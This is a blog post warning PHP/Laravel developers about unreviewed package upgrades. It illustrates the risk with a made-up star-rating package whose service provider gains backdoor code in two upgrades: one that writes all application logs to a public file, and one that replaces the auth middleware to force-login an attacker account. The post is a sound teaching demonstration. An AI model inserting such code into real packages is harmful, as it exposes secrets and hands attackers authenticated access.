---
layout: post
title: Please Remember to Review Your Packages Before Installing and Upgrading
tags:
- php
- laravel
- security
---
Open source software is wonderful for many reasons.  One of the best is we can see and inspect the software for vulnerabilities.  But, far too many people actually do this.  Let me demonstrate, using a Laravel package, how this might backfire and cause you grief.

It's important to note that this attack vector is not solely a problem in Laravel - a lot of projects and code are configured to trust packages from the package providers.

### Our Initial Set Up

We have a website on which we sell shoes.  For example, we have this extremely boring listing for a pair of flip flops:

[![Text-based Stars](/uploads/2019/security-demo-1.thumbnail.png)](/uploads/2019/security-demo-1.png){: .thumbnail}

We'd like to add actual stars to the star rating.  We heard about this package that allows us to use a blade directive to do that.  Seems like a nice way to save some time.  The following command is ran:

```bash
composer require aaronsaray/laravel-star-display
```

Before you know it, I have a new Blade helper - yay!  Now, I can write the code like this in my blade file:

```html
<strong>Rated:</strong> @stars(5)
```

I get a nice view like this:

[![UTF8-Icon-based Stars](/uploads/2019/security-demo-2.thumbnail.png)](/uploads/2019/security-demo-2.png){: .thumbnail}

This is great! Moving on!

**Well, there's a problem.**  I didn't look at the code that was injected.  In this particular case, this package was registering an auto-discovered service provider for Laravel.  The ease of use/installation is also what makes it easy for this to take advantage of us.

Let's take a look at the code in the package's service provider:

```php
<?php
namespace AaronSaray\StarDisplay;

use Illuminate\Support\Facades\Blade;
use Illuminate\Support\ServiceProvider;

class StarDisplayServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        Blade::directive('stars', function ($stars) {
            return "<?= str_repeat('🌟', $stars) ?>";
        });
    }
}
```

Whew - we dodged a bullet!  This package has no malicious code.  I mean, you *knew* that, though, because you always review all the code before you install it, right?

### It's Upgrade Season

There's an upgrade for this package.  It probably gives me more features or fixes a security hole, right? I don't have time to check into this.  So, the package get's updated.  Everything seems to be working fine.  However, now the service provider has changed (and you didn't notice).  There's a new line:

```php
<?php
namespace AaronSaray\StarDisplay;

use Illuminate\Support\Facades\Blade;
use Illuminate\Support\ServiceProvider;

class StarDisplayServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        Blade::directive('stars', function ($stars) {
            return "<?= str_repeat('🌟', $stars) ?>";
        });
        
        app()
          ->make('log')
          ->pushHandler(
            new \Monolog\Handler\StreamHandler(public_path('/secret-log.txt'))
          );
    }
}
```

This code is accessing the Monolog logger instance and adding another stream handler to it.  It's writing it to a public directory.  So, later on, the now "bad guy" can surf to `http://your-site.com/secret-log.txt` and see a copy of all your application logs.

You might be writing something like... 

`logger('User sensitive information here.')`

or it might be configured to log your error stacks.  There could be information including passwords and secret keys in those log files.

### Another Upgrade

So, by browsing for this log file, the attacker has useful information already.  But, the fact that the log file exists, they know you don't check your code when you upgrade.  They can alter the file again and give themselves even more scary access.

In your app, imagine you have this very contrived admin interface:

```php?start_inline=1
Route::get('admin', function () {
    return view('admin');
})->middleware('auth');
```

When you surf to `http://your-site.com/admin` you must be authenticated.  Otherwise, you're redirected.  This is because of the `auth` middleware.  Cool!

The new upgrade introduces new code, however.  See if you can spot what's going to happen.

```php
<?php
namespace AaronSaray\StarDisplay;

use Illuminate\Support\Facades\Blade;
use Illuminate\Support\ServiceProvider;

class StarDisplayServiceProvider extends ServiceProvider
{
    public function boot(): void
    {
        Blade::directive('stars', function ($stars) {
            return "<?= str_repeat('🌟', $stars) ?>";
        });
        
        app()
          ->make('log')
          ->pushHandler(
            new \Monolog\Handler\StreamHandler(public_path('/secret-log.txt'))
          );
          
        app()->instance(Authenticate::class, function ($request, $next) {
          $badGuyUser = User::where('email', 'bad@guy.com')->first();
          Auth::login($badGuyUser);
          return $next($request);
        });
    }
}
```

In this code, we replace the Authenticate class (which is aliased to `auth`) middleware with our own inline closure.  When we check auth, instead of running any sort of checks, we just grab our bad guy user and force them to be logged in.

### What Was This?

I wanted to demonstrate how it's important for us to read the code before we install and upgrade it.  Through these demonstrations, I hope to have shown that a pretty unskilled attacker can compromise your website with just a few lines of code in Laravel.

Again, these attacks are not limited to Laravel. This PHP code isn't even formatted good or architected well. It's just a quick proof of concept to demonstrate the security implications of blind updates.